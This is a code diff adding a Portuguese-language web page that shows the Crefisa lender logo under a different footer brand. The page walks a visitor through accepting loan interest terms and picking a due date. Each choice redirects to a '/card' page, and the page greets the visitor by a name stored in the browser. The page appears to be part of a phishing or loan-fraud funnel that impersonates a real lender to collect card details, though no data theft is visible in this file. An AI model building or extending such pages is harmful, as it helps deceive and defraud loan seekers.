@@ -1,0 +1,177 @@
+<!DOCTYPE html><html lang="pt-BR">
+    
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    
+    <head>
+<script>
+  window.pixelId = "672d0bea0c6547d971d5134f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .header {
+            background: white;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #FE0064;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #FE0064 !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #e6007e;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+            /* Esconde o elemento por padrão */
+        }
+
+        #conclusao h4 {
+            color: green;
+            /* Define a cor do texto */
+            font-weight: bold;
+            /* Define o texto em negrito */
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+    </style>
+    </head>
+
+<body>
+    <div style="
+    display: grid;
+    grid-template-areas:
+      'top-bar'
+      'content'
+      'footer';
+    grid-template-rows: auto 1fr auto;
+    min-height: 100vh;
+  ">
+        <div class="header">
+            <img decoding="async" style="width: 120px;" src="images/Crefisa.png" alt="Imagem Centralizada" data-lazy-src="https://upload.wikimedia.org/wikipedia/pt/a/a3/Crefisa.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;"
+                    src="../wikipedia/pt/a/a3/Crefisa-4.png" alt="Imagem Centralizada"></noscript>
+        </div>
+
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div style="margin-top: 18px; padding: 2rem 1.5rem 1rem 1.5rem;" class="main-content">
+                <div id="analise-secao" class="mb-3 " style="display: block;">
+                    <p class="text-start"></p>
+                    <p class="text-start">Se houver atraso no pagamento das parcelas, serão aplicados um juros de 0.49%
+                        ao mês. </p>
+                    <button class=" btn-custom rounded-pill" onclick="mostrarPagina('vencimento-secao')">Concordo</button>
+                </div>
+
+                <!-- Seção da escolha do vencimento da fatura -->
+                <div id="vencimento-secao" class="mb-3" style="display: none;">
+                    <p style="font-size: 18px;"> <strong id="nomeCliente">Ótimo!</strong> Agora escolha o dia do
+                        vencimento das parcelas!</p>
+                    <button class="btn-custom w-100" onclick="window.location.href='/card'">05</button>
+                    <button class="btn-custom w-100" onclick="window.location.href='/card'">10</button>
+                    <button class="btn-custom w-100" onclick="window.location.href='/card'">15</button>
+                    <button class="btn-custom w-100" onclick="window.location.href='/card'">25</button>
+                    <button class="btn-custom w-100" onclick="window.location.href='/card'">30</button>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
+                if (dadosUsuario && dadosUsuario.nome) {
+                    const nomeCompleto = dadosUsuario.nome.split(' ');
+                    const primeiroNome = nomeCompleto[0];
+                    const nomeParaMostrar = `${primeiroNome}`;
+                    document.getElementById('nomeCliente').textContent = nomeParaMostrar;
+                } else {
+                    console.error('Nome do usuário não encontrado no localStorage.');
+                }
+            });
+
+            function mostrarPagina(paginaId) {
+                document.getElementById('analise-secao').style.display = 'none';
+                document.getElementById('vencimento-secao').style.display = 'none';
+
+                document.getElementById(paginaId).style.display = 'block';
+            }
+            // Mostra a seção de escolha do vencimento inicialmente
+            mostrarPagina('analise-secao');
+
+            // Event listener para capturar a escolha e mostrar a próxima seção
+            document.querySelectorAll('#vencimento-secao .btn').forEach(button => {
+                button.addEventListener('click', function () {
+                    window.location.href = '/card';
+                });
+            });
+        </script>
+
+        <div class="footer py-4" id="footerChg">
+            © 2024 Sim, Crédito Simples <br>
+            Todos os direitos reservados
+        </div>
+    </div>
+
+</body>
+</html>
